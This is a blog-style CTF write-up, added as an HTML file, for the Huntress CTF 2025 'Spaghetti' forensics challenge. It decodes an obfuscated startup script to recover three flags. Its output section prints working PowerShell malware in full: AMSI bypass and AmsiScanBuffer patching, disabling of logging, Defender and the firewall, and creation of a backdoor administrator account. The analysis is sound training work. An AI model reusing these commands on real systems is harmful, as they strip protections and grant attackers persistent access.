@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Huntress CTF 2025 - Spaghetti</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Huntress CTF 2025 - Spaghetti | Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Huntress CTF 2025 - Spaghetti" />
+<meta name="author" content="alphaz3r0" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge Prompt" />
+<meta property="og:description" content="Challenge Prompt" />
+<link rel="canonical" href="http://localhost:4000/writeup/forensics/misc/Spaghetti" />
+<meta property="og:url" content="http://localhost:4000/writeup/forensics/misc/Spaghetti" />
+<meta property="og:site_name" content="Writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-01T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Huntress CTF 2025 - Spaghetti" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"alphaz3r0","url":"0x41414141-code.github.io"},"dateModified":"2025-11-01T00:00:00+01:00","datePublished":"2025-11-01T00:00:00+01:00","description":"Challenge Prompt","headline":"Huntress CTF 2025 - Spaghetti","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeup/forensics/misc/Spaghetti"},"url":"http://localhost:4000/writeup/forensics/misc/Spaghetti"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    <h1>alphaz3r0@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Huntress CTF 2025 - Spaghetti</h2>
+  <time datetime="2025-11-01T00:00:00+01:00" class="by-line">01 Nov 2025</time>
+  <h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<blockquote>
+  <p>You know, I’ve been thinking… at the end of the day, spaghetti is really just strings of pasta!</p>
+
+  <p>Anyway, we saw this weird file running on startup. Can you figure out what this is?</p>
+
+  <p>I’m sure you’ll get more understanding of the questions below as you explore!</p>
+</blockquote>
+
+<hr />
+
+<h2 id="thought-process">Thought process:</h2>
+
+<p>We are given 2 files:</p>
+
+<p><code class="language-plaintext highlighter-rouge">spaghetti</code> - spaghetti: Non-ISO extended-ASCII text, with CRLF line terminators
+<code class="language-plaintext highlighter-rouge">AYGIW.tmp</code> -AYGIW.tmp: ASCII text, with very long lines (65536), with no line terminators</p>
+
+<p>looking at <code class="language-plaintext highlighter-rouge">spaghetti</code> we find really obfuscated VBS Script.</p>
+
+<p>When I saw this part of the script</p>
+
+<pre><code class="language-vbs">	[byte[]]$WULC4 = HombaAmigo($MainFileSettings.replace('WT','00'))
+</code></pre>
+
+<p>I rememberd that the <code class="language-plaintext highlighter-rouge">AYGIW.tmp</code> had a lot of  “WT”’s in it</p>
+
+<p>i ran a simple command in terminal to replace all instances of “WT” with “00”</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>AYGIW.tmp | <span class="nb">tr</span> <span class="s1">'WT'</span> <span class="s1">'00'</span>
+</code></pre></div></div>
+
+<p>And it looks like hex. So I went to cyberchef and pasted it and put recipe “From Hex”</p>
+
+<p>First line looked promising:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MZ..........ÿÿ..¸.......@.........................................º..´    Í!¸.LÍ!This program cannot be run in DOS mode.
+</code></pre></div></div>
+
+<p>One google search later:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The DOS MZ executable format is the executable file format used for . EXE files in DOS. **The file can be identified by the ASCII string "MZ" (hexadecimal: 4D 5A) at the beginning of the file** (the "magic number"). "MZ" are the initials of Mark Zbikowski, one of the leading developers of MS-DOS.
+</code></pre></div></div>
+
+<p>So we use a little trick with command line with tool <code class="language-plaintext highlighter-rouge">xxd</code></p>
+
+<p>After running this command</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>AYGIW.tmp | <span class="nb">tr</span> <span class="s1">'WT'</span> <span class="s1">'00'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> <span class="o">&gt;</span> decoded
+
+file decoded
+decoded: PE32 executable <span class="k">for </span>MS Windows 5.01 <span class="o">(</span>GUI<span class="o">)</span>, Intel i386, 7 sections
+</code></pre></div></div>
+
+<p>Nice we got an executable. What is the first thing you do with every executable you get in a CTF challenge?</p>
+
+<p>Thats right you run [[strings]]  and [[grep]] for flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings decoded | <span class="nb">grep </span>flag
+flag<span class="o">{</span>39544d3b5374ebf7d39b8c260fc4afd8<span class="o">}</span>
+</code></pre></div></div>
+
+<p>We just got the 1st of three flags.</p>
+
+<p>So lets continue analysing the <code class="language-plaintext highlighter-rouge">spaghetti</code> file</p>
+
+<p>There are 2 big blobs of made with lots of <code class="language-plaintext highlighter-rouge">%</code> and <code class="language-plaintext highlighter-rouge">~</code> characters.</p>
+
+<p>also we see this:</p>
+
+<pre><code class="language-vbs">Replace('~','0').Replace('%','1')))
+$TDefo | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
+</code></pre>
+
+<p>so it just converts it to binary?</p>
+
+<p>Thats right and so we can recreate that with a simple python script that just replaces ~ with 0 and % with 1 and the to turn that binary to ascii.</p>
+
+<h2 id="solutionpython">Solution(Python)</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">binary_to_ascii</span><span class="p">(</span><span class="n">binary_str</span><span class="p">):</span>
+    <span class="n">decoded_text</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_str</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+        <span class="n">byte</span> <span class="o">=</span> <span class="n">binary_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="n">decoded_text</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">decoded_text</span>
+
+<span class="c1"># Extract the encoded string for $MyOasis4
+</span><span class="n">encoded_my_oasis4</span> <span class="o">=</span> <span class="s">"here is blob from $MyOasis4 = (FonatozQZ()"</span>
+<span class="n">encoded_tdefo</span> <span class="o">=</span> <span class="s">"here is blob from $TDefo = (FonatozQZ()"</span>
+<span class="n">binary_my_oasis4</span> <span class="o">=</span> <span class="n">encoded_my_oasis4</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'~'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'%'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+<span class="n">binary_tdefo</span> <span class="o">=</span> <span class="n">encoded_tdefo</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'~'</span><span class="p">,</span> <span class="s">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'%'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+<span class="n">decoded_text</span> <span class="o">=</span> <span class="n">binary_to_ascii</span><span class="p">(</span><span class="n">binary_my_oasis4</span><span class="p">)</span>
+<span class="n">decoded_text</span> <span class="o">+=</span> <span class="n">binary_to_ascii</span><span class="p">(</span><span class="n">binary_tdefo</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">decoded_text</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<h3 id="output">Output</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start-sleep 23
+# Disable Script Logging:
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
+$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
+
+# Matt Graebers Reflection method:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Forcing an error:
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+
+
+start-sleep 12
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+
+
+start-sleep 7
+
+
+$ZQCUW = @"
+using System;
+using System.Runtime.InteropServices;
+public class ZQCUW {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $ZQCUW
+
+$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))")
+$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))")
+# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;'))")
+$p = 0
+[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
+$TLML = "0xB8"
+$PURX = "0x57"
+$YNWL = "0x00"
+$RTGX = "0x07"
+$XVON = "0x80"
+$WRUD = "0xC3"
+$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
+[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
+--------------------------------------------------------------------------------
+Decoded string (2681 chars):
+Add-MpPreference -ExclusionExtension ".bat"
+Add-MpPreference -ExclusionExtension ".ppam"
+Add-MpPreference -ExclusionExtension ".xls"
+Add-MpPreference -ExclusionExtension ".bat"
+Add-MpPreference -ExclusionExtension ".exe"
+Add-MpPreference -ExclusionExtension ".vbs"
+Add-MpPreference -ExclusionExtension ".js"
+Add-MpPreference -ExclusionPath  C:\
+Add-MpPreference -ExclusionPath  D:\
+Add-MpPreference -ExclusionPath  E:\
+Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
+# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
+Add-MpPreference -ExclusionProcess explorer.exe
+Add-MpPreference -ExclusionProcess kernel32.dll
+Add-MpPreference -ExclusionProcess aspnet_compiler.exe
+Add-MpPreference -ExclusionProcess cvtres.exe
+Add-MpPreference -ExclusionProcess CasPol.exe
+Add-MpPreference -ExclusionProcess csc.exe
+Add-MpPreference -ExclusionProcess Msbuild.exe
+Add-MpPreference -ExclusionProcess ilasm.exe
+Add-MpPreference -ExclusionProcess InstallUtil.exe
+Add-MpPreference -ExclusionProcess jsc.exe
+Add-MpPreference -ExclusionProcess Calc.exe
+Add-MpPreference -ExclusionProcess powershell.exe
+Add-MpPreference -ExclusionProcess rundll32.exe
+Add-MpPreference -ExclusionProcess mshta.exe
+Add-MpPreference -ExclusionProcess cmd.exe
+Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus
+Add-MpPreference -ExclusionProcess wscript.exe
+Add-MpPreference -ExclusionIpAddress 127.0.0.1
+Add-MpPreference -ThreatIDDefaultAction_Actions 6
+Add-MpPreference -AttackSurfaceReductionRules_Ids 0
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -PUAProtection disable
+Set-MpPreference -HighThreatDefaultAction 6 -Force
+Set-MpPreference -ModerateThreatDefaultAction 6
+Set-MpPreference -LowThreatDefaultAction 6
+Set-MpPreference -SevereThreatDefaultAction 6
+Set-MpPreference -ScanScheduleDay 8
+New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+Stop-Service -Name WinDefend -Confirm:$false -Force
+Set-Service -Name WinDefend -StartupType Disabled
+net user System32 /add
+net user System32 123
+net localgroup administrators System32 /add
+net localgroup "Remote Desktop Users" System32 /add
+net stop WinDefend
+net stop WdNisSvc
+sc delete windefend
+netsh advfirewall set allprofiles state off
+</code></pre></div></div>
+
+<p>Look there it is another easy flag: <code class="language-plaintext highlighter-rouge">flag{60814731f508781b9a5f8636c817af9d}</code></p>
+
+<p>One more to go.</p>
+
+<p>While looking at this output one thing caught my eye:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))")
+$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))")
+# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;'))")
+</code></pre></div></div>
+
+<p>Html decode? Searching we see:</p>
+
+<p>“HTML decoding is  the process of converting special character sequences, called HTML entities, back into their original, human-readable characters”</p>
+
+<p>And there are many decoders online lets use one and only CyberChef</p>
+
+<p>Inputing these:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;
+&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;
+&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#98;&amp;#51;&amp;#49;&amp;#51;&amp;#55;&amp;#57;&amp;#52;&amp;#100;&amp;#99;&amp;#101;&amp;#102;&amp;#51;&amp;#51;&amp;#53;&amp;#100;&amp;#97;&amp;#54;&amp;#50;&amp;#48;&amp;#54;&amp;#100;&amp;#53;&amp;#52;&amp;#97;&amp;#102;&amp;#56;&amp;#49;&amp;#98;&amp;#54;&amp;#50;&amp;#48;&amp;#51;&amp;#125;
+</code></pre></div></div>
+
+<p>And choosing From HTML Entity Recipe we get:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amsi.dll
+AmsiScanBuffer
+flag{b313794dcef335da6206d54af81b6203}
+</code></pre></div></div>
+
+<p>And here is the 3rd and final flag.</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   
+
+  
+</body>
+
+</html>
